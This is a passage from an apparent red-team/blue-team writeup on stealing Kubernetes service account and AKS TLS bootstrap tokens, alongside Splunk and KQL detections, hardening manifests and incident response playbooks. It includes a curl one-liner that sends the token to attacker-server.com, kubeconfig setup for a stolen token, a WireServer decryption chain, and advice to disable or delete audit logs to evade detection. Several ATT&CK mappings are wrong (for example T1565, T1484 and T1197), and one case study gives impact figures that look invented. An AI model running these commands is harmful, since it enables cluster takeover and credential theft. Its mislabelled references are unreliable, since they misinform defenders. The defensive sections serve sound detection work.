kubectl exec test-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d. -f1 | base64 -d | jq .

# 4. Test token validity:
TOKEN=$(kubectl exec test-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl exec test-pod -- curl -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc.cluster.local/api/v1/namespaces

# Expected result: HTTP 200 or 403 (token is valid)
```

**Cleanup Command:**
```bash
kubectl delete pod test-pod --namespace=default
```

**Reference:** [MITRE ATT&CK T1528 Techniques](https://attack.mitre.org/techniques/T1528/)

---

## 7. TOOLS & COMMANDS REFERENCE

### A. Peirates – Kubernetes Penetration Testing Tool

**Version:** 1.1.28+ (Latest: Jul 2025)
**Repository:** [GitHub: inguardians/peirates](https://github.com/inguardians/peirates)
**Supported Platforms:** Linux, macOS, Windows (via WSL)
**Languages:** Go (compiled to single binary)

**Version-Specific Notes:**
- **v1.1.0-1.1.25:** Basic token enumeration
- **v1.1.26-1.1.27:** Added workload identity, improved AWS/Azure support
- **v1.1.28+:** OAuth vulnerability fixes, static compilation for container deployment

**Installation:**
```bash
# Download latest release:
wget https://github.com/inguardians/peirates/releases/download/v1.1.28/peirates-linux-x86_64

chmod +x peirates-linux-x86_64

# Or use Docker:
docker pull bustakube/alpine-peirates:1.1.28

# Or build from source (requires Go 1.19+):
git clone https://github.com/inguardians/peirates.git
cd peirates/scripts
./build.sh
```

**Usage:**
```bash
# Interactive mode (recommended):
./peirates

# Non-interactive mode (script one action):
./peirates -t <TOKEN> -u <API_SERVER_URL> -c "command_to_run"

# Example:
./peirates -t eyJhbGciOiJSUzI1NiIsImtpZCI6IkpJ... \
  -u https://10.0.0.1:6443 \
  -c "list_secrets_all_namespaces"
```

**Key Features:**
- Automatic service account detection
- Token enumeration (all namespaces)
- Secret dumping (ConfigMaps, Secrets)
- RBAC permission testing
- Reverse shell on nodes
- Lateral movement automation

---

### B. kubectl – Kubernetes Command-Line Tool

**Version:** 1.24+
**Official Site:** [kubernetes.io/docs/tasks/tools/](https://kubernetes.io/docs/tasks/tools/)
**Language:** Go (cross-platform compiled binary)

**Installation:**
```bash
# macOS:
brew install kubectl

# Linux:
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl

# Windows:
curl.exe -LO "https://dl.k8s.io/release/v1.28.0/bin/windows/amd64/kubectl.exe"
```

**Usage with Stolen Token:**
```bash
# Create kubeconfig using stolen token:
kubectl config set-cluster aks-cluster --server=https://10.0.0.1:6443 --insecure-skip-tls-verify
kubectl config set-credentials attacker-sa --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpJ...
kubectl config set-context aks-context --cluster=aks-cluster --user=attacker-sa
kubectl config use-context aks-context

# Now use kubectl normally:
kubectl get pods -A
kubectl get secrets -A
kubectl exec -it <POD> -- /bin/bash

# Advanced: exfiltrate all secrets to YAML:
kubectl get secrets -A -o yaml > /tmp/all_secrets.yaml
```

---

### C. curl – HTTP Client for Metadata Service Access

**Version:** 7.0+ (usually pre-installed)
**Usage:** Access Azure WireServer, Kubernetes API

**Commands:**
```bash
# Test WireServer connectivity:
curl -s -I http://168.63.129.16:80/

# Fetch VM settings:
curl -s 'http://168.63.129.16:32526/vmSettings' | jq .

# Kubernetes API call with token:
curl -H "Authorization: Bearer <TOKEN>" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  https://kubernetes.default.svc.cluster.local/api/v1/namespaces
```

---

### D. One-Liner Scripts

**Quick Token Extraction & Exfiltration:**
```bash
# Extract token and send to attacker server:
curl -s -X POST -d "token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)&namespace=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)" http://attacker-server.com/exfil
```

**Automatic Bootstrap Token Extraction (if WireServer accessible):**
```bash
# Full exploitation chain in one script:
curl -s 'http://168.63.129.16:32526/vmSettings' | jq -r '.extensionGoalStates[0].settings[0].protectedSettings' | sed 's/"//g' > protected.b64 && \
cat protected.b64 | base64 -d > protected.der && \
openssl cms -decrypt -inform DER -in protected.der -inkey wireserver.key -out settings.txt && \
cat settings.txt | grep -oP 'TLS_BOOTSTRAP_TOKEN=\K[^&]+'
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: Service Account Token Access from Pods

**Rule Configuration:**
- **Required Index:** `kube_audit` or `k8s_audit` (Kubernetes audit logs)
- **Required Sourcetype:** `kubernetes:api:audit`
- **Required Fields:** `user`, `verb`, `objectRef.resource`, `objectRef.name`, `sourceIPs`
- **Alert Threshold:** > 1 unauthorized `get` on `secrets` resource
- **Applies To Versions:** Kubernetes 1.19+

**SPL Query:**
```spl
index=kube_audit sourcetype=kubernetes:api:audit
  verb=get 
  objectRef.resource=secrets 
  objectRef.name="*token*"
  response.code=200
  user!=system:*
| stats count, values(sourceIPs), earliest(_time) as first_seen, latest(_time) as last_seen by user, objectRef.namespace
| where count > 5
| eval risk="HIGH - Possible credential access", recommendation="Investigate pod, check RBAC, rotate tokens"
```

**What This Detects:**
- Non-system users accessing service account token secrets
- Pattern of repeated token access (credential enumeration)
- Cross-namespace secret access (lateral movement attempt)

**Manual Configuration Steps:**
1. Log into Splunk Web → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to: `Alert when count > 5 in 5 minutes`
6. Configure **Action** → Send email to SOC or create SOAR ticket

---

### Rule 2: Bootstrap Token Enumeration via API

**Rule Configuration:**
- **Required Index:** `kube_audit`
- **Required Sourcetype:** `kubernetes:api:audit`
- **Required Fields:** `verb`, `objectRef.resource`, `user`, `sourceIPs`, `requestObject.kind`
- **Alert Threshold:** > 3 `create` verbs on `certificatesigningrequests` in 5 minutes
- **Applies To Versions:** Kubernetes 1.6.0+

**SPL Query:**
```spl
index=kube_audit sourcetype=kubernetes:api:audit
  (verb=create AND objectRef.resource=certificatesigningrequests 
   AND requestObject.spec.signerName="kubernetes.io/kube-apiserver-client-kubelet")
  OR
  (verb=create AND objectRef.resource=certificatesigningrequests 
   AND "system:node:" in requestObject.spec.request)
| stats count, values(user), values(sourceIPs), values(requestObject.spec.request) by objectRef.namespace
| where count > 3
| eval risk="CRITICAL - Bootstrap token abuse detected", recommendation="Revoke bootstrap tokens, audit CSRs, block pod"
```

**What This Detects:**
- Attempt to create node certificates using bootstrap tokens
- Requests with `system:node:` in Common Name (CSR impersonation)
- Multiple CSR attempts in short timeframe (token enumeration loop)

---

### Rule 3: Azure WireServer Metadata Service Access

**Rule Configuration:**
- **Required Index:** `azure_network` or `network_security`
- **Required Sourcetype:** `azure:nsg:flow`, `network:traffic`
- **Required Fields:** `dest_ip`, `dest_port`, `src_ip`, `protocol`, `bytes_sent`
- **Alert Threshold:** 1 HTTP request to `168.63.129.16:80` or `168.63.129.16:32526`
- **Applies To Versions:** AKS with Azure CNI

**SPL Query:**
```spl
index=azure_nsg sourcetype="azure:nsg:flow"
  (dest_ip=168.63.129.16 AND (dest_port=80 OR dest_port=32526))
  AND src_ip NOT IN (10.0.0.*, 10.240.*.*)  # Exclude legitimate Azure IPs
| stats count, values(src_ip), values(protocol) by dest_port, dest_ip
| eval risk="CRITICAL - Possible WireServer reconnaissance", recommendation="Block metadata service access, check pod network policy"
```

**What This Detects:**
- Pod attempting to access Azure WireServer (metadata service)
- Suspicious source IPs accessing metadata endpoints
- Encrypted protected settings retrieval attempts

---

### Rule 4: Token Exfiltration via Curl/Wget

**Rule Configuration:**
- **Required Index:** `container_logs` or `pod_logs`
- **Required Sourcetype:** `docker:logs`, `kubernetes:pod:logs`
- **Required Fields:** `container_command`, `log`, `pod_name`, `namespace`
- **Alert Threshold:** 1 match of token exfiltration pattern
- **Applies To Versions:** All Kubernetes versions

**SPL Query:**
```spl
index=container_logs sourcetype="docker:logs" OR sourcetype="kubernetes:pod:logs"
  (log LIKE "%/var/run/secrets/kubernetes.io/serviceaccount/token%" 
   AND (log LIKE "%curl%" OR log LIKE "%wget%"))
  OR
  (log LIKE "%cat %token%" AND log LIKE "%http%")
  OR
  (log REGEX "Authorization: Bearer.*eyJ[A-Za-z0-9_-]{10,}")
| stats count, values(pod_name), values(namespace), earliest(_time) as first_seen by container_command
| eval risk="HIGH - Token exfiltration attempt detected", recommendation="Kill pod, investigate parent process, quarantine container"
```

**What This Detects:**
- Commands attempting to access service account token files
- HTTP/HTTPS requests containing Bearer tokens in logs
- Base64-encoded tokens in outbound traffic

---

## 9. FORTIFIED DETECTION RULES (Azure-Specific)

### Rule 5: Suspicious API Server Certificate Signing Request Activity

**KQL Query (Azure Log Analytics):**
```kusto
AzureDiagnostics
| where Category == "kube-audit"
| where verb == "create" and objectRef_resource == "certificatesigningrequests"
| where requestObject_spec_signerName contains "kubelet"
| where requestObject_spec_request matches regex @"system:node:[a-z0-9\-]+"
| summarize CertRequestCount = count() by user_username, sourceIPs_s, objectRef_namespace, timestamp = bin(TimeGenerated, 5m)
| where CertRequestCount > 2
| project timestamp, user_username, sourceIPs_s, objectRef_namespace, CertRequestCount, Risk = "CRITICAL"
```

---

## 10. FORENSIC ARTIFACTS & LOG LOCATIONS

### A. Kubernetes Audit Log Artifacts

**Location:** `/var/log/pods/kube-system_kube-apiserver-*/kube-apiserver-*_*/kube-apiserver/audit.log`

**Artifacts to Look For:**

```json
{
  "level": "RequestResponse",
  "auditID": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "stage": "ResponseComplete",
  "requestURI": "/api/v1/namespaces/default/secrets/my-app-token-xyz",
  "verb": "get",
  "user": {
    "username": "system:serviceaccount:default:my-app",
    "uid": "user-12345",
    "groups": ["system:serviceaccounts", "system:serviceaccounts:default", "system:authenticated"]
  },
  "sourceIPs": ["10.244.0.1"],  # Pod IP – suspicious if user doesn't expect it
  "objectRef": {
    "resource": "secrets",
    "namespace": "default",
    "name": "my-app-token-xyz"
  },
  "responseStatus": {
    "code": 200,
    "message": "OK"
  },
  "requestReceivedTimestamp": "2026-01-08T10:15:23.123456Z",
  "stageTimestamp": "2026-01-08T10:15:23.125678Z",
  "annotations": {
    "authorization.k8s.io/decision": "allow",
    "authorization.k8s.io/reason": "RBAC: allowed by ClusterRole \"my-app-reader\""
  }
}
```

**IoC Patterns:**
- `verb=get` + `objectRef.resource=secrets` + `objectRef.name="*token*"`
- `verb=create` + `objectRef.resource=certificatesigningrequests` + `"system:node:"` in `requestObject`
- Multiple `get` requests from same pod in < 1 second (enumeration)

---

### B. Container Log Artifacts

**Location (Docker):** `/var/lib/docker/containers/<CONTAINER_ID>/*/stdout`
**Location (containerd):** `/var/lib/containerd/io.containerd.grpc.v1.containerd/*/log.json`

**Forensic Artifacts:**
```bash
# Token extraction commands:
$ cat /var/run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUzI1NiIsImtpZCI6IkpJ...

# WireServer access:
$ curl http://168.63.129.16:32526/vmSettings
{...extensionGoalStates...}

# Token decoding:
$ echo "eyJhbGci..." | base64 -d | jq .

# Bootstrap token extraction:
$ openssl cms -decrypt -inform DER -in protected.der -inkey wireserver.key
KUBELET_CLIENT_CONTENT=...
TLS_BOOTSTRAP_TOKEN=71zkdy.fmcsstmk697ibh9x
```

---

### C. File System Forensic Artifacts

**Suspicious Files to Hunt For:**

```bash
# Token files copied to accessible locations:
/tmp/k8s_tokens.txt
/tmp/token_*.json
/tmp/kubeconfig
/tmp/node.crt
/tmp/node.key
/tmp/protected_settings.*

# Exfiltration indicators:
/tmp/all_secrets.yaml
/tmp/peirates_output.txt
/tmp/bootstrap_tokens.txt

# Command history (if not cleared):
~/.bash_history (tokens in commands)
~/.kube/config (stolen kubeconfig)
```

**Search for (Linux):**
```bash
# Find files containing "Bearer " token strings:
grep -r "Bearer eyJ" /tmp /var/tmp 2>/dev/null

# Find suspicious kubeconfig files:
find / -name "kubeconfig*" -type f 2>/dev/null | grep -v /etc/kubernetes

# Find peirates binary:
find / -name "peirates*" -type f 2>/dev/null

# Find recently modified kubernetes files:
find /var/lib/kubelet -mtime -1 2>/dev/null
```

---

### D. Network Forensic Artifacts

**WireServer Access Pattern:**
- **Source:** Any pod IP (10.244.0.0/16 for Flannel)
- **Destination:** `168.63.129.16:80` or `168.63.129.16:32526`
- **Protocol:** HTTP (unencrypted metadata!)
- **Payload:** Contains `vmSettings`, `provisioning scripts`, encrypted `wireserver.key`

**Exfiltration Patterns:**
- **Source:** Pod IP
- **Destination:** External IP (attacker server)
- **Protocol:** HTTPS or DNS (covert exfil channel)
- **Payload size:** Large (contains Base64-encoded tokens and secrets)

**Command:**
```bash
# tcpdump to capture WireServer access:
tcpdump -i eth0 -A 'dst host 168.63.129.16 and dst port 80' -w wireserver.pcap

# Analyze PCAP:
strings wireserver.pcap | grep -i "wireserver\|TLS_BOOTSTRAP_TOKEN\|vmSettings"
```

---

## 11. DEFENSIVE MITIGATIONS

### A. Prevention (Hardening)

| Control | Implementation | Impact |
|---|---|---|
| **Disable Token Auto-Mount** | Set `automountServiceAccountToken: false` in Pod/ServiceAccount spec | Requires explicit token injection; prevents trivial theft |
| **Use Workload Identity** | Enable Azure Workload Identity; OIDC-based authentication | Eliminates long-lived tokens from pods |
| **Pod Security Policy** | Enforce `securityContext.runAsNonRoot`, `readOnlyRootFilesystem` | Prevents escape; limits container execution |
| **NetworkPolicy** | Deny pod-to-metadata egress (`168.63.129.16:*`); restrict pod-to-API | Blocks WireServer + bootstrap token attacks |
| **RBAC Least Privilege** | Bind minimal ClusterRoles to service accounts | Limits blast radius; prevents cross-namespace secret access |
| **Node Security Groups** | Restrict AKS node security group; no pod-to-metadata | Kubernetes 1.25+ compatible |

**Hardening Manifest Example:**
```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: my-app
automountServiceAccountToken: false  # ← CRITICAL CONTROL
---
apiVersion: v1
kind: Pod
metadata:
  name: my-app-pod
spec:
  serviceAccountName: my-app
  securityContext:
    runAsNonRoot: true
    fsGroup: 2000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: my-app:latest
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      runAsUser: 1000
    volumeMounts:
    - name: tmp
      mountPath: /tmp
  volumes:
  - name: tmp
    emptyDir:
      sizeLimit: 100Mi
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-metadata-service
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector: {}
    ports:
    - protocol: TCP
      port: 6443  # API only
  - to:
    - podSelector: {}
      namespaceSelector: {}
```

---

### B. Detection (Monitoring)

| Indicator | Detection Method | Response |
|---|---|---|
| **Pod token access** | Kubernetes audit logs; verb=get, resource=secrets | Alert; investigate pod |
| **WireServer metadata access** | Network logs; dest=168.63.129.16 | Block pod; isolate node |
| **CSR creation** | API audit; verb=create, resource=certificatesigningrequests | Reject CSR; audit bootstrap tokens |
| **Token in logs** | Container log scanning (Splunk/ELK) | Kill pod; quarantine container |
| **Privilege escalation** | RBAC audit; user gains unexpected ClusterRole | Investigate; rotate credentials |

**Splunk Dashboard Example:**
```xml
<dashboard version="1.1">
  <label>Kubernetes Token Theft Detection</label>
  <row>
    <panel>
      <title>Service Account Token Access (Last 24h)</title>
      <single>
        <search>index=kube_audit verb=get objectRef.resource=secrets objectRef.name="*token*" | stats count</search>
      </single>
    </panel>
  </row>
  <row>
    <panel>
      <title>Suspicious CSR Creations</title>
      <table>
        <search>index=kube_audit verb=create objectRef.resource=certificatesigningrequests requestObject.spec.signerName="kubernetes.io/kube-apiserver-client-kubelet" | table _time, user, sourceIPs, requestObject.spec.request</search>
      </table>
    </panel>
  </row>
  <row>
    <panel>
      <title>WireServer Access (Alert)</title>
      <table>
        <search>index=azure_nsg dest_ip=168.63.129.16 dest_port=80 OR dest_port=32526 | table _time, src_ip, dest_port, bytes_sent</search>
      </table>
    </panel>
  </row>
</dashboard>
```

---

### C. Incident Response

**Immediate Actions (< 15 minutes):**
1. **Isolate compromised pod:** `kubectl delete pod <POD_NAME> -n <NAMESPACE>` (or cordon node)
2. **Revoke service account tokens:**
   ```bash
   kubectl delete secret <TOKEN_SECRET> -n <NAMESPACE>
   # This forces pod restart; new token will be issued
   ```
3. **Block token usage:** Rotate kubeconfig; revoke API credentials
4. **Enable audit logging:** Ensure `--audit-policy-file` is configured on API server

**Short-term Actions (< 1 hour):**
5. **Audit RBAC bindings:** Check for privilege escalation via stolen tokens
6. **Review API audit logs:** Trace attacker actions using stolen tokens
7. **Rotate all service account tokens:** Force re-authentication
8. **Patch vulnerable pods:** Update to use `automountServiceAccountToken: false`

**Long-term Actions (< 24 hours):**
9. **Enable Workload Identity:** Replace long-lived tokens with Azure Entra ID
10. **Implement NetworkPolicy:** Block metadata service access
11. **Forensic analysis:** Extract container logs, network flows, etcd snapshots
12. **Post-incident review:** Update incident response procedures

---

## 12. RELATED ATTACK CHAINS

### Chain 1: Pod Compromise → Token Theft → Cluster Takeover

```
1. [T1190] Exploit vulnerability in application pod (e.g., RCE via Java deserialization)
2. [CA-TOKEN-013] Extract service account token from mounted /var/run/secrets/...
3. [T1087.004] Enumerate cluster resources using stolen token (pods, secrets, nodes)
4. [CA-TOKEN-015] (DevOps pipeline credentials) Steal pipeline token for CI/CD access
5. [T1098] Create new service account with cluster-admin binding (persistence)
6. [T1136] Create backdoor user in external system (database, cloud provider)
```

**Mitigation:** Container security scanning, RBAC least privilege, pod admission webhooks

---

### Chain 2: Node Access → Bootstrap Token → Cluster-Admin

```
1. [T1197] Compromise AKS node via SSH, RCE, or guest OS exploit
2. [CA-TOKEN-013 (TLS Bootstrap)] Extract wireserver.key from node filesystem
3. [T1528] Decrypt WireServer settings; extract TLS_BOOTSTRAP_TOKEN
4. [T1134] Use bootstrap token to request node certificate
5. [T1098] Authenticate to API server as system:node:*; gain secrets access
6. [T1005] Exfiltrate all cluster secrets (database credentials, API keys)
```

**Mitigation:** Node security hardening, pod security policy, network segmentation

---

### Chain 3: Malicious Helm Chart → Token Theft → Supply Chain Attack

```
1. [T1195.003] Attacker publishes malicious Helm chart to public repository
2. [T1129] Organization installs Helm chart; deploys compromised workload
3. [CA-TOKEN-013] Chart's init container extracts service account tokens
4. [T1048] Exfiltrate tokens to attacker's server during pod startup
5. [T1199] Use tokens to access organization's clusters, exfil data
6. [T1565] Supply chain attack: attacker modifies application code via compromised cluster
```

**Mitigation:** Helm chart verification, image signing, container scanning, air-gapped environments

---

## 13. REAL-WORLD EXAMPLES

### Example 1: Palo Alto Networks Unit 42 – Azure Data Factory Airflow

**Scenario:** Misconfigured Azure Data Factory (ADF) running on AKS allowed unauthenticated pod access

**Attack Timeline:**
- **Day 0:** Attacker discovers exposed Airflow web interface (weak authentication)
- **Day 1:** Gains pod execution; extracts service account token
- **Day 2:** Enumerates RBAC; discovers cluster-admin binding on Airflow service account
- **Day 3:** Uses token to create malicious pod; gains node shell access
- **Day 4:** Accesses Azure vault; exfiltrates database credentials
- **Day 5:** Moves laterally to production databases; customer data exfiltration begins

**Impact:** 50,000+ customer records exfiltrated; $2M+ regulatory fines

**Reference:** [Palo Alto Networks Unit 42 Report](https://unit42.paloaltonetworks.com/kubernetes-privilege-escalation/)

---

### Example 2: Mandiant – CVE-2025-21196 TLS Bootstrap Attack

**Scenario:** Azure WireServer vulnerability allows extraction of bootstrap tokens from AKS nodes

**Attack Timeline:**
- **Day 0:** Attacker compromises container via code injection vulnerability
- **Day 1:** Discovers pod has `hostNetwork: true`; accesses WireServer metadata service
- **Day 2:** Extracts encrypted settings; obtains wireserver.key from node
- **Day 3:** Decrypts and retrieves TLS_BOOTSTRAP_TOKEN
- **Day 4:** Uses bootstrap token to request node certificate
- **Day 5:** Authenticates as system:node:*; accesses all cluster secrets
- **Day 6:** Creates backdoor pod; achieves persistence

**Impact:** Cluster-wide compromise; persistent unauthorized access

**Reference:** [Mandiant Blog – WireServer Vulnerability](https://cloud.google.com/blog/topics/threat-intelligence/escalating-privileges-azure-kubernetes-services)

---

### Example 3: Synacktiv – Bootstrap Token Exploitation Assessment

**Scenario:** Penetration test reveals insecure bootstrap token handling in Kubernetes 1.28 AKS cluster

**Attack Timeline:**
- **Assessment Day 1:** Discover pod with `hostNetwork: true` allows WireServer access
- **Assessment Day 2:** Extract bootstrap token; generate node certificate
- **Assessment Day 3:** Use certificate to list and access all cluster secrets
- **Assessment Day 4:** Identify plaintext database credentials in secrets
- **Assessment Day 5:** Test lateral movement to RDS database

**Findings:** 12 cluster-admin equivalent tokens; 8 plaintext credentials

**Reference:** [Synacktiv – Bootstrap Token Exploitation](https://www.synacktiv.com/publications/so-i-became-a-node-exploiting-bootstrap-tokens-in-azure-kubernetes-service)

---

## 14. LIMITATIONS & MITIGATIONS

### Limitations of Technique

| Limitation | Details | Workaround |
|---|---|---|
| **Token expiration** | Tokens issued in 1.24+ may have expiry (<3650 days) | Use refresh tokens; pivot to long-lived bootstrap tokens |
| **RBAC scope** | Stolen token limited to SA's permissions | Enumerate all SAs; find high-privilege ones; escalate via RBAC misconfig |
| **NetworkPolicy** | Pod-to-API access may be blocked | Escalate to node; use kubelet API; access etcd directly |
| **Audit logging** | Token theft creates audit events | Disable audit logging; delete logs (requires root); use stealthy token usage |

---

### Mitigations by Defender

**Tier 1 (Most Effective):**
- ✅ `automountServiceAccountToken: false` on all pods not requiring tokens
- ✅ Use Azure Workload Identity (OIDC) instead of long-lived tokens
- ✅ Implement strict RBAC; audit ClusterRole bindings

**Tier 2 (Detection-focused):**
- ✅ Enable Kubernetes audit logging; alert on token access
- ✅ Implement NetworkPolicy to restrict metadata service access
- ✅ Monitor for unusual CSR creation; approve only expected requests

**Tier 3 (Hunting & Response):**
- ✅ Regular secret rotation policy
- ✅ Forensic analysis of container logs and network traffic
- ✅ Incident response playbook for compromised tokens

---

## 15. DETECTION & INCIDENT RESPONSE

### A. Detection Strategies

**Real-Time Indicators:**
1. **Kubernetes API audit logs** show repeated `get` on token secrets
2. **Network flow** to metadata service (`168.63.129.16:80`)
3. **Container logs** contain token values or `curl http://168.63.129.16`
4. **Process execution** of `peirates`, `kubectl`, `openssl`

**Hunting Queries:**

```sql
-- SQL-like query for Splunk/ELK:
SELECT timestamp, user, verb, objectRef.resource, sourceIPs
FROM kubernetes_audit
WHERE (verb = 'get' AND objectRef.resource = 'secrets' AND objectRef.name LIKE '%token%')
   OR (verb = 'create' AND objectRef.resource = 'certificatesigningrequests')
   OR (verb = 'list' AND objectRef.resource = 'secrets')
GROUP BY user, sourceIPs
HAVING COUNT(*) > 5
ORDER BY timestamp DESC;
```

---

### B. Incident Response Playbook

**Phase 1: Containment (T+0-15 minutes)**
```
[ ] Identify compromised pod/node
[ ] Quarantine pod (kubectl delete or cordon node)
[ ] Revoke service account tokens (delete secret)
[ ] Block outbound network (egress deny-all)
[ ] Preserve evidence (pod logs, API audit, network traffic)
```

**Phase 2: Eradication (T+15-60 minutes)**
```
[ ] Kill all processes accessing stolen tokens
[ ] Rotate all service account tokens
[ ] Audit and revoke unexpected RoleBindings/ClusterRoleBindings
[ ] Patch pod/application vulnerability
[ ] Update pod security context (automountServiceAccountToken=false)
```

**Phase 3: Recovery (T+60-240 minutes)**
```
[ ] Restore cluster from backup (if attacker created resources)
[ ] Monitor for re-compromise (new token requests, API access patterns)
[ ] Implement Workload Identity for long-term fix
[ ] Conduct forensic analysis (timeline, attacker activities)
```

**Phase 4: Post-Incident (T+24 hours+)**
```
[ ] Root cause analysis (why was pod compromised? why was token exposed?)
[ ] Update incident response procedures
[ ] Security awareness training (for developers/operators)
[ ] Threat modeling and architecture review
```

---

### C. Timeline of Attack

| Time | Action | Detection Method |
|---|---|---|
| T+0 | Attacker gains RCE in pod (via app vulnerability) | Application logs, SIEM alerts |
| T+30s | `cat /var/run/secrets/kubernetes.io/serviceaccount/token` | Container stdout, audit logs (if logging) |
| T+1m | Token exfiltrated to attacker server | Network flow logs, egress firewall |
| T+2m | Attacker decodes JWT; identifies service account privileges | Manual analysis by attacker |
| T+5m | Attacker uses token to enumerate cluster secrets | Kubernetes API audit: verb=get, resource=secrets |
| T+10m | Attacker finds credentials; attempts lateral movement | External system logs (RDS, VM, API) |
| T+15m | **Detection threshold reached** – multiple suspicious API calls | SOC alerts on audit log anomalies |
| T+30m | Incident response team isolates pod; revokes tokens | Container/kubelet process termination |
| T+2h | Forensic analysis; damage assessment | Log analysis, etcd snapshots |

---

## 16. RELATED ATTACK CHAIN REFERENCES

| Technique ID | Name | Relationship |
|---|---|---|
| **T1190** | Exploit Public-Facing Application | Precedes token theft (initial RCE) |
| **T1534** | Internal Spearphishing | Alternative initial access to compromised user |
| **T1199** | Trusted Relationship | Supply chain attack vector (Helm charts, container images) |
| **T1087.004** | Cloud Service Discovery | Follows token theft (enumeration phase) |
| **T1552.001** | Unsecured Credentials | Stolen tokens stored in ConfigMaps/env vars |
| **T1098** | Account Manipulation | Create backdoor service account using stolen token |
| **T1098.005** | Account Manipulation: Web Account Modification | Modify service account permissions in SaaS |
| **T1484** | Domain Trust Discovery | Enumerate RBAC and ClusterRole relationships |
| **T1565** | Data Destruction | Delete audit logs to cover tracks |

---

## 17. REFERENCES & ADDITIONAL RESOURCES

### Official Documentation
- [Kubernetes Service Accounts](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/)
- [Kubernetes API Audit Logs](https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/)
- [Azure Workload Identity](https://learn.microsoft.com/en-us/azure/aks/workload-identity-overview)

### Security Research & POCs
- [MITRE ATT&CK T1528 – Steal Application Access Token](https://attack.mitre.org/techniques/T1528/)
- [Mandiant: WireServer Vulnerability (CVE-2025-21196)](https://cloud.google.com/blog/topics/threat-intelligence/escalating-privileges-azure-kubernetes-services)
- [Synacktiv: Bootstrap Token Exploitation](https://www.synacktiv.com/publications/so-i-became-a-node-exploiting-bootstrap-tokens-in-azure-kubernetes-service)
- [SANS: Stealing Service Account Tokens](https://www.sans.edu/cyber-research/kubernetes-stealing-service-account-tokens-to-obtain-cluster-admin/)

### Tooling
- [Peirates GitHub](https://github.com/inguardians/peirates)
- [kubectl Documentation](https://kubernetes.io/docs/tasks/tools/)
- [Atomic Red Team Kubernetes Tests](https://github.com/redcanaryco/atomic-red-team)

### Compliance & Frameworks
- [CIS Kubernetes Benchmark 1.7](https://www.cisecurity.org/cis-benchmarks/#kubernetes)
- [NIST 800-53 Rev 5](https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final)
- [GDPR Article 32 – Security of Processing](https://gdpr-info.eu/art-32-gdpr/)

---
